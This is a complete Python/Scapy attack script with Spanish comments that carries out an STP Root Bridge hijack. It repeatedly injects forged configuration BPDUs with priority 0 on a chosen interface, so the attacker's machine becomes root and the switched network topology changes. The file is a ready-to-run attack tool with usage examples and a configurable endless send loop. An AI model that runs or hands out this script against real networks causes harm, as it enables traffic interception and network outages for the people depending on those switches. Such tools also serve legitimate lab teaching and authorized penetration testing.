#!/usr/bin/env python3
"""
STP Root Claim / Root Bridge Hijack
Inyecta BPDUs de configuracion con prioridad muy baja para ser elegido
Root Bridge y alterar la topologia de spanning-tree.

Ejemplos:
    sudo python3 stp_root.py -i eth0
    sudo python3 stp_root.py -i eth0 -p 0 -d 2
"""
import argparse
import time
from scapy.all import sendp, Dot3, LLC, STP, get_if_hwaddr

def parse_args():
    ap = argparse.ArgumentParser(description="Ataque STP Root Claim")
    ap.add_argument("-i", "--iface", required=True, help="Interfaz de red")
    ap.add_argument("-p", "--priority", type=int, default=0,
                    help="Prioridad del bridge (0 = mas baja, gana; def. 0)")
    ap.add_argument("-d", "--delay", type=float, default=2.0,
                    help="Intervalo de envio (hello time, def. 2s)")
    ap.add_argument("-c", "--count", type=int, default=0,
                    help="Numero de BPDUs (0 = infinito)")
    return ap.parse_args()

def build_bpdu(src_mac, prio):
    return (Dot3(dst="01:80:c2:00:00:00", src=src_mac) /
            LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
            STP(proto=0, version=0, bpdutype=0, bpduflags=0,
                rootid=prio, rootmac=src_mac, pathcost=0,
                bridgeid=prio, bridgemac=src_mac,
                portid=0x8001, age=0, maxage=20, hellotime=2, fwddelay=15))

def main():
    args = parse_args()
    src_mac = get_if_hwaddr(args.iface)
    print(f"--- Iniciando STP Root Claim por {args.iface} ---")
    print(f"Reclamando Root Bridge (prioridad {args.priority}, MAC {src_mac}).")
    print("Presiona Ctrl+C para detener el ataque.\n")

    contador = 0
    try:
        while args.count == 0 or contador < args.count:
            sendp(build_bpdu(src_mac, args.priority), iface=args.iface, verbose=False)
            contador += 1
            print(f"[+] BPDU root enviado #{contador} (prio={args.priority})")
            time.sleep(args.delay)
    except KeyboardInterrupt:
        pass
    print(f"\n[!] STP Root Claim detenido. Total: {contador} BPDUs.")

if __name__ == "__main__":
    main()
